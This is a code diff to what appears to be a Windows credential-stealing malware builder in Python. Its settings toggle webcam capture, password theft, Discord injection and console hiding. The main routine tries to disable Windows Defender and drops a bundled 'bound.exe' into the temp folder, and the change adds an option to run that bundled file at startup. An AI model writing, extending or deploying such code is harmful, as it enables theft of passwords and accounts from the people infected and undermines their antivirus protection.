@@ -36,6 +36,7 @@ class Settings:
     ArchivePassword = "%archivepassword%"
     HideConsole = bool("%hideconsole%")
     Debug = bool("%debug%")
+    RunBoundOnStartup = bool("%boundfilerunonstartup%")
 
     CaptureWebcam = bool("%capturewebcam%")
     CapturePasswords = bool("%capturepasswords%")
@@ -56,7 +57,7 @@ class Settings:
     DiscordInjection = bool("%discordinjection%")
 
 if not hasattr(sys, "_MEIPASS"):
-    sys._MEIPASS = os.path.dirname(os.path.abspath(__file__)) # Sets _MEIPASS if does not exist (py mode)
+    sys._MEIPASS = os.path.dirname(os.path.abspath(__file__)) # Defines _MEIPASS if does not exist (py mode)
 
 ctypes.windll.kernel32.SetConsoleMode(ctypes.windll.kernel32.GetStdHandle(-11), 7) # Enables VT100 escape sequences
 logging.basicConfig(format='\033[1;36m%(funcName)s\033[0m:\033[1;33m%(levelname)7s\033[0m:%(message)s')
@@ -1780,7 +1781,7 @@ if __name__ == "__main__" and os.name == "nt":
     Logger.info("Trying to disable defender")
     Utility.DisableDefender() # Tries to disable Defender
 
-    if Utility.GetSelf()[1] and not Utility.IsInStartup() and os.path.isfile(boundFileSrc:= os.path.join(sys._MEIPASS, "bound.blank")):
+    if Utility.GetSelf()[1] and (Settings.RunBoundOnStartup or not Utility.IsInStartup()) and os.path.isfile(boundFileSrc:= os.path.join(sys._MEIPASS, "bound.blank")):
         try:
             Logger.info("Trying to extract bound file")
             if os.path.isfile(boundFileDst:= os.path.join(os.getenv("temp"), "bound.exe")): # Checks if any bound file exists (only for exe mode)
